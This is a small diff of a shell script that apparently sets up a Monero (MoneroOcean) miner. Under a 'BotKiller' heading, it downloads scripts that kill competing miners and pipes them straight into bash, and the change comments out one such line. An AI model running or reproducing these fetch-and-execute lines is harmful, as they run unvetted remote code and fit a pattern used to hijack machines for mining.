@@ -22,7 +22,7 @@ EMAIL=$2 # this one is optional
 #BotKiller
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
-curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
+# curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
 
 # checking prerequisites
 
